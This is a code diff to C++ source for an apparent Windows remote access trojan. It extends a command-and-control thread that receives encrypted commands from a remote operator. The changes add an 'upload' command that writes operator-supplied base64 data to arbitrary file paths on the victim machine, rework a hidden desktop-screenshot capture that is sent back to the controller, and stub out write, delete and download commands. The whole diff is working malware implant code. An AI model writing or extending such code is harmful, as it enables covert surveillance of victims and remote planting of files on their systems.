@@ -13,6 +13,9 @@
 #include <lmcons.h>
 #include <gdiplus.h>
 
+#include <ole2.h>
+#include <strmif.h>
+
 #pragma comment(lib, "crypt32.lib")
 #pragma comment(lib, "gdiplus.lib")
 
@@ -35,7 +38,7 @@ static int g_rc4KeyLen = 0;
 
 typedef std::vector<std::string> STR_LIST;
 
-std::string fnBase64Decode(const std::string& szInput)
+std::string fnBase64DecodeString(const std::string& szInput)
 {
     if (szInput.empty())
         return "";
@@ -50,6 +53,25 @@ std::string fnBase64Decode(const std::string& szInput)
         return std::string(abDecoded.data(), nDecodedLength);
 
     return "";
+}
+
+std::vector<BYTE> fnBase64Decode(const std::string& szInput)
+{
+    if (szInput.empty())
+        return std::vector<BYTE>();
+
+    DWORD nDecodedLength = 0;
+    if (!CryptStringToBinaryA(szInput.c_str(), (DWORD)szInput.length(), CRYPT_STRING_BASE64, NULL, &nDecodedLength, NULL, NULL))
+        return std::vector<BYTE>();
+
+    std::vector<BYTE> abDecoded(nDecodedLength);
+    if (CryptStringToBinaryA(szInput.c_str(), (DWORD)szInput.length(), CRYPT_STRING_BASE64, abDecoded.data(), &nDecodedLength, NULL, NULL))
+    {
+        abDecoded.resize(nDecodedLength);
+        return abDecoded;
+    }
+
+    return std::vector<BYTE>();
 }
 
 std::string fnBase64Encode(const std::string& szInput)
@@ -116,7 +138,7 @@ STR_LIST fnDecapsulate(const std::string& szInput, char splitter = '|')
 
     while (std::getline(ss, token, splitter))
     {
-        std::string szDecoded = fnBase64Decode(token);
+        std::string szDecoded = fnBase64DecodeString(token);
         abResult.push_back(szDecoded);
     }
 
@@ -293,61 +315,76 @@ int GetEncoderClsid(const WCHAR* format, CLSID* pClsid)
 
 std::string fnTakeScreenshot()
 {
-    Gdiplus::GdiplusStartupInput gdiplusStartupInput;
-    ULONG_PTR gdiplusToken;
-    Gdiplus::GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
-
-    std::string szBase64Img = "";
-
     HWND hDesktopWnd = GetDesktopWindow();
+    if (!hDesktopWnd) return "";
+
     HDC hDesktopDC = GetDC(hDesktopWnd);
-    HDC hCaptureDC = CreateCompatibleDC(hDesktopDC);
+    if (!hDesktopDC) return "";
 
     int nWidth = GetSystemMetrics(SM_CXSCREEN);
     int nHeight = GetSystemMetrics(SM_CYSCREEN);
-
-    HBITMAP hCaptureBitmap = CreateCompatibleBitmap(hDesktopDC, nWidth, nHeight);
-    SelectObject(hCaptureDC, hCaptureBitmap);
-
-    BitBlt(hCaptureDC, 0, 0, nWidth, nHeight, hDesktopDC, 0, 0, SRCCOPY | CAPTUREBLT);
-    Gdiplus::Bitmap* bmp = Gdiplus::Bitmap::FromHBITMAP(hCaptureBitmap, NULL);
-
-    if (bmp)
-    {
-        CLSID jpgClsid;
-        if (GetEncoderClsid(L"image/jpeg", &jpgClsid) != -1)
-        {
-            IStream* pStream = NULL;
-            if (CreateStreamOnHGlobal(NULL, TRUE, &pStream) == S_OK)
-            {
-                bmp->Save(pStream, &jpgClsid, NULL);
-
-                HGLOBAL hGlobal = NULL;
-                GetHGlobalFromStream(pStream, &hGlobal);
-                if (hGlobal)
-                {
-                    DWORD nBufSize = (DWORD)GlobalSize(hGlobal);
-                    LPVOID pData = GlobalLock(hGlobal);
-                    if (pData && nBufSize > 0)
-                    {
-                        std::string rawImage((const char *)pData, nBufSize);
-                        szBase64Img = fnBase64Encode(rawImage);
-                        GlobalUnlock(hGlobal);
-                    }
-                }
-
-                pStream->Release();
-            }
-        }
-
-        delete bmp;
+    if (nWidth <= 0 || nHeight <= 0) {
+        ReleaseDC(hDesktopWnd, hDesktopDC);
+        return "";
     }
 
+    HDC hCaptureDC = CreateCompatibleDC(hDesktopDC);
+    if (!hCaptureDC) {
+        ReleaseDC(hDesktopWnd, hDesktopDC);
+        return "";
+    }
+
+    HBITMAP hCaptureBitmap = CreateCompatibleBitmap(hDesktopDC, nWidth, nHeight);
+    if (!hCaptureBitmap) {
+        DeleteDC(hCaptureDC);
+        ReleaseDC(hDesktopWnd, hDesktopDC);
+        return "";
+    }
+
+    HBITMAP hOldBitmap = (HBITMAP)SelectObject(hCaptureDC, hCaptureBitmap);
+    BitBlt(hCaptureDC, 0, 0, nWidth, nHeight, hDesktopDC, 0, 0, SRCCOPY | CAPTUREBLT);
+
+    BITMAPINFO bmi = { 0 };
+    bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
+    bmi.bmiHeader.biWidth = nWidth;
+    bmi.bmiHeader.biHeight = -nHeight;
+    bmi.bmiHeader.biPlanes = 1;
+    bmi.bmiHeader.biBitCount = 24;
+    bmi.bmiHeader.biCompression = BI_RGB;
+
+    int rowStride = ((nWidth * 3 + 3) & ~3);
+    DWORD imageSize = rowStride * nHeight;
+    DWORD headerSize = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
+    DWORD totalSize = headerSize + imageSize;
+
+    std::string szBase64Img = "";
+
+    char* pBuffer = (char*)malloc(totalSize);
+    if (pBuffer)
+    {
+        BITMAPFILEHEADER* pBfh = (BITMAPFILEHEADER*)pBuffer;
+        pBfh->bfType = 0x4D42; // "BM"
+        pBfh->bfSize = totalSize;
+        pBfh->bfReserved1 = 0;
+        pBfh->bfReserved2 = 0;
+        pBfh->bfOffBits = headerSize;
+
+        memcpy(pBuffer + sizeof(BITMAPFILEHEADER), &bmi.bmiHeader, sizeof(BITMAPINFOHEADER));
+
+        int lines = GetDIBits(hCaptureDC, hCaptureBitmap, 0, nHeight, pBuffer + headerSize, &bmi, DIB_RGB_COLORS);
+        if (lines > 0)
+        {
+            std::string rawImage(pBuffer, totalSize);
+            szBase64Img = fnBase64Encode(rawImage);
+        }
+
+        free(pBuffer);
+    }
+
+    SelectObject(hCaptureDC, hOldBitmap);
     DeleteObject(hCaptureBitmap);
     DeleteDC(hCaptureDC);
     ReleaseDC(hDesktopWnd, hDesktopDC);
-
-    Gdiplus::GdiplusShutdown(gdiplusToken);
 
     return szBase64Img;
 }
@@ -489,6 +526,60 @@ DWORD WINAPI C2CommunicationThread(LPVOID lpParam)
                     fnSendEncryptedResponse(s, szResult, pSend);
                 }
             }
+            else if (ls[1] == "write")
+            {
+                
+            }
+            else if (ls[1] == "delete")
+            {
+
+            }
+            else if (ls[1] == "upload")
+            {
+                std::string szFilePath = ls[2];
+                int nCode = std::atoi(ls[3].c_str());
+
+                if (nCode == 1)
+                {
+                    // write
+
+                    std::vector<BYTE> abData = fnBase64Decode(ls[4]);
+                    if (abData.empty() && !ls[4].empty())
+                    {
+                        fnSendEncryptedResponse(s, "0", pSend);
+                        continue;
+                    }
+
+                    HANDLE hFile = CreateFileA(szFilePath.c_str(), FILE_WRITE_DATA, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+
+                    if (INVALID_HANDLE_VALUE == hFile)
+                    {
+                        fnSendEncryptedResponse(s, "0", pSend);
+                        continue;
+                    }
+
+                    SetFilePointer(hFile, 0, NULL, FILE_END);
+
+                    DWORD nWritten = 0;
+                    BOOL bWrite = WriteFile(hFile, abData.data(), (DWORD)abData.size(), &nWritten, NULL);
+                    CloseHandle(hFile);
+
+                    if (bWrite && nWritten == abData.size())
+                        fnSendEncryptedResponse(s, "1", pSend);
+                    else
+                        fnSendEncryptedResponse(s, "0", pSend);
+                }
+                else if (nCode == 2)
+                {
+                    // finish
+
+                    fnSendEncryptedResponse(s, "2", pSend);
+                }
+            }
+            else if (ls[1] == "download")
+            {
+
+            }
         }
         else if (ls[0] == "screen")
         {
@@ -497,10 +588,6 @@ DWORD WINAPI C2CommunicationThread(LPVOID lpParam)
                 fnSendEncryptedResponse(s, szResult, pSend);
             else
                 fnSendEncryptedResponse(s, "[-] Failed to capture screenshot.", pSend);
-        }
-        else if (ls[0] == "webcam")
-        {
-
         }
         else if (ls[0] == "exit")
         {
